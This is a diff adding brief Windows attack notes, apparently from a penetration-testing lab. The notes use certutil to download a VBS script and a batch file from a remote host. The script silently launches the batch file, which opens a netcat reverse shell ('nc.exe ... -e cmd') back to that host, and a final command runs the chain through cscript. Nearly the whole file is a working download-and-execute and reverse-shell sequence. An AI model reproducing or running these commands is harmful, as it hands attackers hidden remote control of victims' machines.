@@ -1,0 +1,16 @@
+certutil -urlcache -split -f http://192.168.119.149/hidden.vbs
+--------
+content
+--------
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "C:\windows\temp\test\nc.bat" & Chr(34), 0
+Set WshShell = Nothing
+
+certutil -urlcache -split -f http://192.168.119.149/nc.bat
+--------
+content
+--------
+
+C:\windows\temp\test\nc.exe 192.168.119.149 4488 -e cmd
+
+cmd /c cscript hidden.vbs
